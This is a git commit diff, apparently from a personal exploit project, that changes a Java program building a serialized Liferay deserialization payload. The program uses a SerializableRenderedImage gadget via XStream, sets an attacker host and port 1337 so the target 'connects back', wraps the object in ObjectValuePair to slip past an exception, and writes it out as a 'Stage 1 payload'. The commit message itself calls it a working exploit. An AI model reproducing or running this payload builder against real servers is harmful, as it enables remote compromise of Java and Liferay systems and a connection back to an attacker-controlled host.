a5e04ee672c36d111b2951cd6d61f0eda0a41281
Hoang <hoangha2@viettel.com.vn>
2019-10-07 00:29:49 -0700

    Working exploit. Need to revamp output

--- src/main/java/Test/test/App.java
+++ src/main/java/Test/test/App.java
@@ -1,12 +1,20 @@
 package Test.test;
 
+import com.liferay.portal.kernel.util.ObjectValuePair;
+
 import org.xml.sax.*;
+
 import java.awt.image.BufferedImage;
 import java.io.*;
+
 import javax.media.jai.remote.SerializableRenderedImage;
+
 import com.thoughtworks.xstream.*;
+
 import java.net.*;
+
 import org.w3c.dom.*;
+
 import javax.xml.parsers.*;
 import javax.xml.transform.OutputKeys;
 import javax.xml.transform.Transformer;
@@ -50,7 +58,7 @@ public class App
         // Create a serializable image
     	BufferedImage image = new BufferedImage(1,1,BufferedImage.TYPE_BYTE_BINARY);
     	SerializableRenderedImage simage = new SerializableRenderedImage(image);
-    	String path = "C:\\Windows\\temp\\payload.file";
+    	String path = "C:\\Users\\admin\\Downloads\\payload.file";
     	//Desired port
     	String port = "1337";
     	//Desired host
@@ -67,29 +75,43 @@ public class App
         	hostXml = xstream.toXML(ip);
         	hostDoc = loadXMLFromString(hostXml);
         	payloadDoc = loadXMLFromString(payloadXml);
-        	//System.out.println(hostXml);
-        	//System.out.println(payloadXml);
+        	
+        	/**
+        	System.out.println(payloadXml);
+        	System.out.println("<---------------------->");
+        	*/
+        	
         	//Get the address field out of the created InetAdress object
         	hostDoc.getDocumentElement().normalize();
-        		//System.out.println(hostDoc.getDocumentElement().getNodeName());
         	Element addressField = (Element)hostDoc.getElementsByTagName("address").item(0);
         	String address = addressField.getTextContent();
+        	
         	//Assign the fields the right value
         	payloadDoc.getDocumentElement().normalize();
         	Element portElement = (Element) payloadDoc.getElementsByTagName("port").item(0);
         	portElement.setTextContent(port);
         	Element addressElement = (Element) payloadDoc.getElementsByTagName("address").item(0);
         	addressElement.setTextContent(address);
-        	//System.out.println(toString(payloadDoc));
+        	System.out.println(toString(payloadDoc));
+        	System.out.println("<---------------------->");
         	//Rebuild object from XML
         	simage = (SerializableRenderedImage) xstream.fromXML(toString(payloadDoc));
+        	//Wrap the object into the ObjectValuePair in order to avoid the exception
+        	ObjectValuePair<SerializableRenderedImage,Object> payload = new ObjectValuePair<SerializableRenderedImage,Object>(simage,null);
+        	
+        	
+        	payloadXml = xstream.toXML(payload);       	
+        	payloadDoc = loadXMLFromString(payloadXml);
+        	System.out.println(toString(payloadDoc));
+
         	//Serialize the object and write to a file
         	FileOutputStream fos = new FileOutputStream(path);
         	ObjectOutputStream out = new ObjectOutputStream(fos);
-        	out.writeObject(simage);
+        	out.writeObject(payload);
         	out.close();
         	fos.close();
         	System.out.printf("Stage 1 payload written to %s", path);
+        	
     	}catch(Exception e){
     		//This won't ever happen since it connects back
     		System.err.println("lol");
